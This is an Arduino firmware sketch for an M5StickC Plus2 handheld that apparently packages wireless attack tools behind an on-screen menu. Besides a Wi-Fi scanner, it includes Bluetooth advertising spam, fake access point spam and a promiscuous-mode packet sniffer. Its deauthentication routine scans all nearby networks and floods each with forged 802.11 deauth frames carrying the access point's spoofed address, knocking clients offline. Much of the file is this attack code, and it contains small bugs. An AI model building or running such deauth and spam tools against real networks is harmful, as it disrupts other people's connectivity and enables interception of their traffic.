#include <M5StickCPlus2.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEAdvertising.h>
#include "esp_wifi.h"

BLEAdvertising* pAdvertising;


typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration_id;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
  uint16_t seq_ctrl;
  uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_ieee80211_packet_t;

const char* menuItems[] = {
  "[ WiFi Scan ]",
  "[ BLE Spam ]",
  "[ AP Spam ]",
  "[ WiFi Deauth ]",
  "[ Packet Intercept ]",
  "[ Exit ]"
};
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
int menuIndex = 0;

void drawMenu() {
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextColor(ORANGE);
  M5.Lcd.println("Theo Kershaw!\n");

  for (int i = 0; i < menuSize; i++) {
    M5.Lcd.setCursor(10, i * 20);
    M5.Lcd.setTextColor(i == menuIndex ? RED : WHITE, BLACK);
    M5.Lcd.println(menuItems[i]);
  }
}

void scanWiFi() {
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextColor(GREEN);
  M5.Lcd.println("Scanning WiFi...");
  delay(100); 

  int n = WiFi.scanNetworks();
  if (n == 0) {
    M5.Lcd.println("No networks found");
  } else {
    for (int i = 0; i < n && i < 10; ++i) {
      M5.Lcd.setTextColor(WHITE);
      M5.Lcd.printf("%d: %s (%d)\n", i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i));
    }
  }

  M5.Lcd.setTextColor(YELLOW);
  M5.Lcd.println("\nPress BtnB to return");

  while (true) {
    M5.update();
    if (M5.BtnB.wasPressed()) {
      drawMenu();
      break;
    }
  }
}

void startBleSpam() {
  M5.Lcd.println("Starting TK Spam...");

  BLEDevice::init("TK Spammer...");
  pAdvertising = BLEDevice::getAdvertising();

  BLEAdvertisementData advData;
  advData.setName("TK Spam!");
  advData.setManufacturerData("Tk Spam!");

  pAdvertising->setAdvertisementData(advData);
  pAdvertising->setScanResponse(true);
  pAdvertising->start();
}

void stopBleSpam() {
  if (pAdvertising) {
    pAdvertising->stop();
  }
}

void snifferCallBack(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) {
    return;
  }

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*) buf;
  wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
  wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

  char bufStr[100];
  snprintf(bufStr, sizeof(bufStr), "PktType: %d\n", type);
  M5.Lcd.printf(bufStr);
  snprintf(bufStr, sizeof(bufStr), "Src: %02X:%02X:%02X:%02X:%02X:%02X\n",
           hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
           hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
  M5.Lcd.printf(bufStr);
  snprintf(bufStr, sizeof(bufStr), "Dst: %02X:%02X:%02X:%02X:%02X:%02X\n",
           hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
           hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
  M5.Lcd.printf(bufStr);

  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.printf("Type: %d\n", type);
  M5.Lcd.printf("Src: %02X:%02X:%02X:%02X:%02X:%02X\n",
                hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
  M5.Lcd.printf("Dst: %02X:%02X:%02X:%02X:%02X:%02X\n",
                hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
                hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);

  delay(1000);
}

void packetInter() {
  Serial.begin(115200);
  M5.Lcd.println("Starting packet intercepter...\n");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallBack);
}

void fakeApSpam() {
  WiFi.mode(WIFI_AP);

  for (int i = 0; i < 10; i++) {
    String ssid = "TK_FAKE_" + String(random(1000, 9999));
    WiFi.softAP(ssid.c_str());
    M5.Lcd.setTextColor(RED);
    M5.Lcd.println("Spamming AP: " + ssid);
    
    M5.Lcd.setTextColor(YELLOW);
    M5.Lcd.println("\nPress BtnB to return");

    while (true) {
      M5.update();
      if (M5.BtnB.wasPressed()) {
        WiFi.softAPdisconnect(true);
        drawMenu();
        break;
      }
    }
  }
  WiFi.mode(WIFI_STA);
}

void deauthAtk() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_STA);
  
  M5.Lcd.println("Scanning nearby Wi-Fi...");
  int n = WiFi.scanNetworks();
  M5.Lcd.println("Found network" + n);

  for (int i = 0; i < n; i++) {
    uint8_t apMac[6];
    WiFi.BSSID(i, apMac);

    M5.Lcd.println("Deauthing AP: " + WiFi.SSID(i));

    for (int j = 0; j < 10; j++) {
      sendDeauth(apMac);
      delay(100);
    }
  }

  WiFi.disconnect();
  M5.Lcd.println("Deauth attack complete!");
}

void sendDeauth(uint8_t* apMac) {
  uint8_t deauthPacket[30] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
    0x00, 0x00,
    0x07, 0x00
  };
  esp_wifi_set_channel(WiFi.channel(), WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void setup() {
  auto cfg = M5.config();
  M5.begin(cfg);

  M5.Lcd.setRotation(3);
  M5.Lcd.setTextSize(2);
  M5.Lcd.fillScreen(WHITE);
  M5.Lcd.setCursor(0, 20);
  M5.Lcd.setTextColor(RED);
  M5.Lcd.println("Booting TK Firmware...");
  delay(1500);
  M5.Lcd.fillScreen(BLACK);

  M5.Lcd.setTextSize(1);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  drawMenu();
}

void loop() {
  M5.update();

  if (M5.BtnB.wasPressed()) {
    menuIndex = (menuIndex + 1) % menuSize;
    drawMenu();
  }

  if (M5.BtnC.wasPressed()) {
    menuIndex = (menuIndex - 1) % menuSize;
    drawMenu();
  }

  if (M5.BtnA.wasPressed()) {
    switch (menuIndex) {
      case 0:
        scanWiFi();
        break;
      case 1:
        startBleSpam();
        break;
      case 2:
        fakeApSpam();
        break;
      case 3:
        deauthAtk();
        break;
      case 4:
        packetInter();
        break;
      case 5:
        M5.Lcd.fillScreen(BLACK);
        M5.Lcd.setCursor(0, 0);
        M5.Lcd.setTextColor(RED);
        M5.Lcd.println("Exiting TKF...");
        delay(2000);
        esp_deep_sleep_start();
        break;
    }
  }
}
